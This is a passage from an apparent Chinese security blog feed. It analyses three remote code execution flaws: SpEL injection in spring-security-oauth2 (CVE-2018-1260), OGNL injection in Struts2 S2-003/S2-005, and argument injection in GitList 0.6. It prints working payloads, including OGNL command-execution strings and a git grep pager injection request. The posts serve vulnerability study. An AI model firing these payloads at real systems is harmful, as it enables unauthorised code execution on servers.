<p>这里获取到了<code>scopes</code>，并且通过for循环生成对应的<code>builder</code>，其实就是html和一些标签等，最后返回的即<code>builder.toString()</code>,其值如下:<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;ul&gt;&lt;li&gt;&lt;div class='form-group'&gt;scope.$&#123;T(java.lang.Runtime).getRuntime().exec("calc.exe")&#125;: &lt;input type='radio' name='scope.$&#123;T(java.lang.Runtime).getRuntime().exec("calc.exe")&#125;' value='true'&gt;Approve&lt;/input&gt; &lt;input type='radio' name='scope.$&#123;T(java.lang.Runtime).getRuntime().exec("calc.exe")&#125;' value='false' checked&gt;Deny&lt;/input&gt;&lt;/div&gt;&lt;/li&gt;&lt;/ul&gt;</div></pre></td></tr></table></figure></p>
<p><code>createScopes</code>结束后将会把上述<code>builder.toString()</code>拼接到<code>template</code>中。<code>createTemplate</code>结束后，在<code>getAccessConfirmation</code>的最后：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">return</span> <span class="keyword">new</span> ModelAndView(<span class="keyword">new</span> SpelView(template), model);</div></pre></td></tr></table></figure></p>
<p>根据<code>template</code>生成对应的<code>SpelView</code>对象，这是其构造函数：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180511/9.png?raw=true" alt=""></p>
<p>此后在页面渲染的过程中，将会执行页面中的Spel表达式<code>${T(java.lang.Runtime).getRuntime().exec(&quot;calc.exe&quot;)}</code>从而造成代码执行。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180511/10.png?raw=true" alt=""></p>
<p>所以综上所述，这个任意代码执行的利用条件实在“苛刻”：</p>
<ol>
<li>需要<code>scopes</code>没有配置白名单，否则直接<code>Invalid scope:xxx</code>。不过大部分OAuth都会限制授权的范围，即指定scopes。</li>
<li>使用了默认的Approval Endpoint，生成对应的template，在spelview中注入spel表达式。不过可能绝大部分使用者都会重写这部分来满足自己的需求，从而导致spel注入不成功。</li>
</ol>
<h1 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h1><p>commit记录： <a href="https://github.com/spring-projects/spring-security-oauth/commit/adb1e6d19c681f394c9513799b81b527b0cb007c" target="_blank" rel="external">https://github.com/spring-projects/spring-security-oauth/commit/adb1e6d19c681f394c9513799b81b527b0cb007c</a></p>
<p>官方将<code>SpelView</code>去除，使用其他方法来生成对应的视图<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180511/11.png?raw=true" alt=""></p>
<h1 id="资料"><a href="#资料" class="headerlink" title="资料"></a>资料</h1><ul>
<li><a href="https://pivotal.io/security/cve-2018-1260" target="_blank" rel="external">CVE-2018-1260: Remote Code Execution with spring-security-oauth2</a></li>
<li><a href="http://projects.spring.io/spring-security-oauth/docs/oauth2.html#Configuring%20Client%20Details" target="_blank" rel="external">spring-security-oauth:Authorization Server Configuration</a></li>
<li><a href="http://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html" target="_blank" rel="external">阮一峰:理解OAuth 2.0</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2330&quot;&gt;RCE with spring-security-oauth2 分析-【CVE-2018-1260】&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
    
    
      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
    
      <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
      <category term="spring" scheme="http://chybeta.github.io/tags/spring/"/>
    
  </entry>
  
  <entry>
    <title>【struts2 命令/代码执行漏洞分析系列】S2-003和S3-005</title>
    <link href="http://chybeta.github.io/2018/05/08/%E3%80%90struts2-%E5%91%BD%E4%BB%A4-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E3%80%91S2-003%E5%92%8CS3-005/"/>
    <id>http://chybeta.github.io/2018/05/08/【struts2-命令-代码执行漏洞分析系列】S2-003和S3-005/</id>
    <published>2018-05-07T23:45:08.000Z</published>
    <updated>2018-05-07T23:58:28.896Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/2323" target="_blank" rel="external">阿里先知安全社区：【struts2 命令/代码执行漏洞分析系列】S2-003和S3-005</a><br><a id="more"></a></p>
<h1 id="S2-003"><a href="#S2-003" class="headerlink" title="S2-003"></a>S2-003</h1><h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>漏洞信息页面： <a href="https://cwiki.apache.org/confluence/display/WW/S2-003" target="_blank" rel="external">https://cwiki.apache.org/confluence/display/WW/S2-003</a></p>
<p>漏洞成因官方概述：XWork ParameterInterceptors bypass allows OGNL statement execution</p>
<p>漏洞影响：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180507/1.png?raw=true" alt=""></p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>s2-003漏洞的payload用到了特殊字符，在高版本tomcat中会失败，需要使用tomcat6来测试。我使用的是6.0.9版本。此外导入的struts版本为2.0.11.2</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>POC:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(&apos;\u0023context[\&apos;xwork.MethodAccessor.denyMethodExecution\&apos;]\u003dfalse&apos;)(bla)(bla)&amp;(&apos;\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\&apos;calc\&apos;)&apos;)(bla)(bla)</div></pre></td></tr></table></figure></p>
<p>回显：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(&apos;\u0023context[\&apos;xwork.MethodAccessor.denyMethodExecution\&apos;]\u003dfalse&apos;)(bla)(bla)&amp;(&apos;\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET&apos;)(kxlzx)(kxlzx)&amp;(&apos;\u0023mycmd\u003d\&apos;ipconfig\&apos;&apos;)(bla)(bla)&amp;(&apos;\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)&apos;)(bla)(bla)&amp;(A)((&apos;\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())&apos;)(bla))&amp;(B)((&apos;\u0023myres\u003dnew\40byte[51020]&apos;)(bla))&amp;(C)((&apos;\u0023mydat.readFully(\u0023myres)&apos;)(bla))&amp;(D)((&apos;\u0023mystr\u003dnew\40java.lang.String(\u0023myres)&apos;)(bla))&amp;(&apos;\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()&apos;)(bla)(bla)&amp;(E)((&apos;\u0023myout.getWriter().println(\u0023mystr)&apos;)(bla))</div></pre></td></tr></table></figure></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在struts/xwork-2.0.5-sources.jar!/com/opensymphony/xwork2/interceptor/ParametersInterceptor.java:177 获取到我们传入的参数</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180507/2.png?raw=true" alt=""></p>
<p>在<code>getValueStack</code>之前，执行了一些初始化操作，比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">OgnlContextState.setDenyMethodExecution(contextMap, true);</div></pre></td></tr></table></figure></p>
<p>将<code>xwork.MethodAccessor.denyMethodExecution</code>设置为<code>true</code>。为了能够调用方法，需要在poc中的第一部分将<code>denyMethodExecution</code>设置为<code>false</code>，之后才能任意代码执行。</p>
<p>跟入<code>setParameters(action, stack, parameters);</code>至 struts/struts/xwork-2.0.5-sources.jar!/com/opensymphony/xwork2/interceptor/ParametersInterceptor.java:201。此部分开始通过迭代器取出一个个传入的参数，并进行处理。</p>
<p>假设此时我传入的参数如下，注意这个与poc的不同在于，我将第一个<code>\u0023</code>替换成了<code>#</code>。：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(&apos;#context[\&apos;xwork.MethodAccessor.denyMethodExecution\&apos;]\u003dfalse&apos;)(bla)(bla)&amp;(&apos;\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\&apos;calc\&apos;)&apos;)(bla)(bla)</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180507/3.png?raw=true" alt=""></p>
<p>跟入<code>acceptableName</code>至 struts/xwork-2.0.5-sources.jar!/com/opensymphony/xwork2/interceptor/ParametersInterceptor.java:271<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">acceptableName</span><span class="params">(String name)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span> (isAccepted(name) &amp;&amp; !isExcluded(name)) &#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>跟入<code>isAccepted(name)</code><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180507/4.png?raw=true" alt=""></p>
<p>这里通过简单的正则表达式<code>[\p{Graph}&amp;&amp;[^,#:=]]*</code>来检测，防止传入恶意特殊字符开头如<code>#</code>等。因此<code>acceptableName</code>返回false，接下来的ognl表达式自然也不会执行了。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (acceptableName) &#123;</div><div class="line">    Object value = entry.getValue();</div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>但如果传入经过编码后的payload。<code>#</code>对应的unicode为<code>\u0023</code>，八进制为<code>\43</code>，则可以绕过上述的检测，也即导致<code>acceptableName</code>为true，从而进一步执行。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180507/5.png?raw=true" alt=""></p>
<p>在设置<code>denyMethodExecution</code>为false后，poc的第二部分就是通过方法调用来执行任意命令了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(&apos;\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\&apos;calc\&apos;)&apos;)(bla)(bla)</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180507/6.png?raw=true" alt=""></p>
<h1 id="S2-005"><a href="#S2-005" class="headerlink" title="S2-005"></a>S2-005</h1><h2 id="漏洞信息-1"><a href="#漏洞信息-1" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>漏洞信息页面： <a href="https://cwiki.apache.org/confluence/display/WW/S2-005" target="_blank" rel="external">https://cwiki.apache.org/confluence/display/WW/S2-005</a></p>
<p>漏洞成因官方概述：XWork ParameterInterceptors bypass allows remote command execution</p>
<p>漏洞影响：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180507/7.png?raw=true" alt=""></p>
<h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>S2-005的出现时因为官方对S2-003的修补的不完全导致的。官方通过增加安全配置禁止静态方法调用（allowStaticMethodAcces）和类方法执行（MethodAccessor.den<br>yMethodExecution）等来修补。但同样的直接使用上面的技巧，更改poc为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(&apos;\u0023_memberAccess[\&apos;allowStaticMethodAccess\&apos;]&apos;)(meh)=true&amp;(aaa)((&apos;\u0023context[\&apos;xwork.MethodAccessor.denyMethodExecution\&apos;]\u003d\u0023foo&apos;)(\u0023foo\u003dnew%20java.lang.Boolean(&quot;false&quot;)))&amp;(asdf)((&apos;\u0023rt.exit(1)&apos;)(\u0023rt\u003d@java.lang.Runtime@getRuntime()))=1</div></pre></td></tr></table></figure></p>
<p>即可设置<code>allowStaticMethodAccess</code>为true，和<code>denyMethodExecution</code>为false，从而导致任意命令执行。可以参考<a href="https://blog.csdn.net/u011721501/article/details/41626959" target="_blank" rel="external">Struts2漏洞分析与研究之S2-005漏洞分析</a>和<a href="http://blog.o0o.nu/2010/07/cve-2010-1870-struts2xwork-remote.html" target="_blank" rel="external">CVE-2010-1870: Struts2/XWork remote command execution</a>。其余的代码调用等，与S2-003相同，分析见上。</p>
<h1 id="ognl的解析"><a href="#ognl的解析" class="headerlink" title="ognl的解析"></a>ognl的解析</h1><p>一个问题，为什么<code>\u0023</code>形式的poc能够被解析呢？<br><img src="" alt=""><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180507/8.png?raw=true" target="_blank" rel="external">https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180507/8.png?raw=true</a></p>
<p>跟入<code>setValue</code> 至 struts/xwork-2.0.5-sources.jar!/com/opensymphony/xwork2/util/OgnlValueStack.java:170</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180507/10.png?raw=true" alt=""></p>
<p>跟入<code>OgnlUtil.setValue</code>,struts/xwork-2.0.5-sources.jar!/com/opensymphony/xwork2/util/OgnlUtil.java:185</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setValue</span><span class="params">(String name, Map context, Object root, Object value)</span> <span class="keyword">throws</span> OgnlException </span>&#123;</div><div class="line">    Ognl.setValue(compile(name), context, root, value);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>此处name即我们传入的参数<code>(\u0023...</code>，跟入<code>compile</code>中的<code>o = Ognl.parseExpression(expression);</code>:</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180507/11.png?raw=true" alt=""></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">parseExpression</span><span class="params">( String expression )</span> <span class="keyword">throws</span> OgnlException</span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        OgnlParser parser = <span class="keyword">new</span> OgnlParser( <span class="keyword">new</span> StringReader(expression) );</div><div class="line">        <span class="keyword">return</span> parser.topLevelExpression();</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
<p>从<code>topLevelExpression</code>就开始了进行语法分析工作。在获得<code>(</code>的token为44后，接着进行<code>expression();</code>的解析。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180507/12.png?raw=true" alt=""></p>
<p>在其中会调用到 ognl/JavaCharStream.java 的<code>readChar</code>。其中代码摘取部分如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">char</span> <span class="title">readChar</span><span class="params">()</span> <span class="keyword">throws</span> java.io.IOException</span></div><div class="line">&#123;</div><div class="line">    ...</div><div class="line">    <span class="keyword">char</span> c;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> ((buffer[bufpos] = c = ReadByte()) == <span class="string">'\\'</span>)</div><div class="line">    &#123;</div><div class="line">    ...</div><div class="line">    <span class="keyword">int</span> backSlashCnt = <span class="number">1</span>;</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (;;) <span class="comment">// Read all the backslashes</span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">try</span></div><div class="line">        &#123;</div><div class="line">            <span class="keyword">if</span> ((buffer[bufpos] = c = ReadByte()) != <span class="string">'\\'</span>)</div><div class="line">            &#123;</div><div class="line">                UpdateLineColumn(c);</div><div class="line">                <span class="comment">// found a non-backslash char.</span></div><div class="line">                <span class="keyword">if</span> ((c == <span class="string">'u'</span>) &amp;&amp; ((backSlashCnt &amp; <span class="number">1</span>) == <span class="number">1</span>))</div><div class="line">                &#123;</div><div class="line">                <span class="keyword">if</span> (--bufpos &lt; <span class="number">0</span>)</div><div class="line">                    bufpos = bufsize - <span class="number">1</span>;</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">                &#125;</div><div class="line"></div><div class="line">                backup(backSlashCnt);</div><div class="line">                <span class="keyword">return</span> <span class="string">'\\'</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        ...</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
<p>读取<code>\</code>，并在之后如果遇到了<code>u</code>则进一步处理：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180507/13.png?raw=true" alt=""><br>从而把<code>\u0023</code>转换成了<code>#</code>。之后执行ognl表达式时即执行<code>&quot;#context[\&#39;xwork.MethodAccessor.denyMethodExecution\&#39;]=false&quot;</code></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180507/14.png?raw=true" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2323&quot;&gt;阿里先知安全社区：【struts2 命令/代码执行漏洞分析系列】S2-003和S3-005&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
    
    
      <category term="代码执行" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    
      <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
      <category term="struts2" scheme="http://chybeta.github.io/tags/struts2/"/>
    
      <category term="s2" scheme="http://chybeta.github.io/tags/s2/"/>
    
  </entry>
  
  <entry>
    <title>GitList 0.6 Unauthenticated RCE 分析</title>
    <link href="http://chybeta.github.io/2018/04/30/GitList-0-6-Unauthenticated-RCE-%E5%88%86%E6%9E%90/"/>
    <id>http://chybeta.github.io/2018/04/30/GitList-0-6-Unauthenticated-RCE-分析/</id>
    <published>2018-04-30T04:25:26.000Z</published>
    <updated>2018-05-01T12:14:53.243Z</updated>
    
    <content type="html"><![CDATA[<p>GitList 0.6 Unauthenticated RCE 分析<br><a id="more"></a></p>
<h1 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h1><p>Gitlist 0.6 下载地址： <a href="https://github.com/klaussilveira/gitlist/releases/download/0.6.0/gitlist-0.6.0.tar.gz" target="_blank" rel="external">https://github.com/klaussilveira/gitlist/releases/download/0.6.0/gitlist-0.6.0.tar.gz</a></p>
<p>解压出来后，将其中的config.ini-example重命名为config.ini，并将其中第四行修改指向repo的地址，以我为例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">repositories[] = &apos;/home/chybeta/test/&apos;</div></pre></td></tr></table></figure></p>
<p>在<code>test</code>目录下建立repo：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">mkdir gitlist_rce</div><div class="line">cd gitlist_rce</div><div class="line">echo &quot;chybeta&quot; &gt; README.md</div><div class="line">git init</div><div class="line">git add *</div><div class="line">git commit -m &quot;gitlist_rce&quot;</div></pre></td></tr></table></figure></p>
<p>其余问题，可以直接参考<a href="https://www.sitepoint.com/installing-gitlist-for-local-repos/" target="_blank" rel="external">Installing GitList for Local Reposs</a></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180501/1.png?raw=true" alt=""></p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>在 gitlist/src/Controller/TreeController.php:51行：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?</span></div><div class="line">$route-&gt;post(<span class="string">'&#123;repo&#125;/tree/&#123;branch&#125;/search'</span>, <span class="function"><span class="keyword">function</span> <span class="params">(Request $request, $repo, $branch = <span class="string">''</span>, $tree = <span class="string">''</span>)</span> <span class="title">use</span> <span class="params">($app)</span> </span>&#123;</div><div class="line">    $repository = $app[<span class="string">'git'</span>]-&gt;getRepositoryFromName($app[<span class="string">'git.repos'</span>], $repo);</div><div class="line">    <span class="keyword">if</span> (!$branch) &#123;</div><div class="line">        $branch = $repository-&gt;getHead();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    $query = $request-&gt;get(<span class="string">'query'</span>);</div><div class="line">    $breadcrumbs = [[<span class="string">'dir'</span> =&gt; <span class="string">'Search results for: '</span> . $query, <span class="string">'path'</span> =&gt; <span class="string">''</span>]];</div><div class="line">    $results = $repository-&gt;searchTree($query, $branch);</div><div class="line">...</div></pre></td></tr></table></figure></p>
<p>当我们在repo中进行搜索时，以搜索字符串”chybeta”为例<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180501/2.png?raw=true" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">POST /gitlist/gitlist_rce/tree/master/search HTTP/1.1</div><div class="line"></div><div class="line">query=chybeta</div></pre></td></tr></table></figure>
<p>则对应的变量即为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">repo =&gt; gitlist_rce</div><div class="line">branch =&gt; master</div><div class="line">query =&gt; chybeta</div></pre></td></tr></table></figure></p>
<p>进入到searchTree函数中，即gitlist/src/Git/Repository.php第320行：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">searchTree</span><span class="params">($query, $branch)</span></span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($query)) &#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        $query = escapeshellarg($query);</div><div class="line"></div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            $results = <span class="keyword">$this</span>-&gt;getClient()-&gt;run(<span class="keyword">$this</span>, <span class="string">"grep -i --line-number &#123;$query&#125; $branch"</span>);</div><div class="line">        &#125; <span class="keyword">catch</span> (\RuntimeException $e) &#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">        &#125;</div></pre></td></tr></table></figure></p>
<p><code>query</code>参数经过了<code>escapeshellarg</code>函数的过滤，<a href="http://php.net/manual/zh/function.escapeshellarg.php" target="_blank" rel="external">官方文档</a>:</p>
<blockquote>
<p>escapeshellarg()把字符串转码为可以在 shell 命令里使用的参数。 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 exec(), system() 执行运算符.</p>
</blockquote>
<p>之后进入run方法，gitlist/vendor/klaussilveira/gitter/lib/Gitter/Client.php:63：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span><span class="params">($repository, $command)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (version_compare(<span class="keyword">$this</span>-&gt;getVersion(), <span class="string">'1.7.2'</span>, <span class="string">'&gt;='</span>)) &#123;</div><div class="line">        $command = <span class="string">'-c "color.ui"=false '</span> . $command;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    $process = <span class="keyword">new</span> Process(<span class="keyword">$this</span>-&gt;getPath() . <span class="string">' '</span> . $command, $repository-&gt;getPath());</div><div class="line">    $process-&gt;setTimeout(<span class="number">180</span>);</div><div class="line">    $process-&gt;run();</div></pre></td></tr></table></figure></p>
<p>在<code>$process = new Process()</code>处最终构成的命令为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/usr/bin/git grep -i --line-number &apos;chybeta&apos; master</div></pre></td></tr></table></figure></p>
<p>在<a href="https://git-scm.com/docs/git-grep#git-grep---open-files-in-pagerltpagergt" target="_blank" rel="external"><code>git grep</code>命令</a>中提到：</p>
<blockquote>
<p>Open the matching files in the pager (not the output of grep). If the pager happens to be “less” or “vi”, and the user specified only one pattern, the first file is positioned at the first match automatically. The pager argument is optional; if specified, it must be stuck to the option without a space. If pager is unspecified, the default pager will be used (see core.pager in git-config[1]).</p>
</blockquote>
<p>本意上，这个参数的作用是可以选择pager，比如less或者vi，在查找到匹配的文件后使用指定的pager打开。比如匹配到的文件是README.md，则相当于执行<code>vi READEME.md</code>或<code>less README.md</code>。但倘若我们指定<code>--open-files-in-pager=id;</code>，注意有一个<code>;</code>，则在匹配到文件后，则相当于执行<code>id; README.md</code>，在unix中分号表示顺序的执行各条命令而不关心是否失败。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180501/3.png?raw=true" alt=""></p>
<p>不过在执行之前经过了<code>escapeshellarg</code>，会在字符串两边加上单引号，这会有影响吗？不会。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180501/4.png?raw=true" alt=""></p>
<p>所以当构造如下的数据包：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">POST /gitlist/gitlist_rce/tree/c/search HTTP/1.1</div><div class="line"></div><div class="line">query=--open-files-in-pager=touch /tmp/test/chybeta</div></pre></td></tr></table></figure></p>
<p>注意修改了<code>tree/master/search</code> 为<code>tree/c/search</code>，也即使<code>branch</code>值为<code>c</code>，这样拼接出来的最后的语句即为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/usr/bin/git grep -i --line-number &apos;--open-files-in-pager=touch /tmp/test/chybeta&apos; c</div></pre></td></tr></table></figure></p>
<p>当进行查找时，由于READEME.md（内容为chybeta）中含有字符<code>c</code>，因此可以查找成功，之后由于注入参数的关系，将会执行<code>touch /tmp/test/chybeta</code>，将会在/tmp/test/目录下创建一个新的文件。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180501/5.png?raw=true" alt=""></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://xz.aliyun.com/t/2315" target="_blank" rel="external">谈escapeshellarg绕过与参数注入漏洞</a></li>
<li><a href="https://security.szurek.pl/exploit-bypass-php-escapeshellarg-escapeshellcmd.html" target="_blank" rel="external">Exploit/bypass PHP escapeshellarg/escapeshellcmd functions</a></li>
<li><a href="http://hatriot.github.io/blog/2014/06/29/gitlist-rce/" target="_blank" rel="external">Gitlist - Commit to Rce</a></li>
<li><a href="https://www.sitepoint.com/installing-gitlist-for-local-repos/" target="_blank" rel="external">Installing GitList for Local Reposs</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;GitList 0.6 Unauthenticated RCE 分析&lt;br&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
    
    
      <category term="php" scheme="http://chybeta.github.io/tags/php/"/>
    
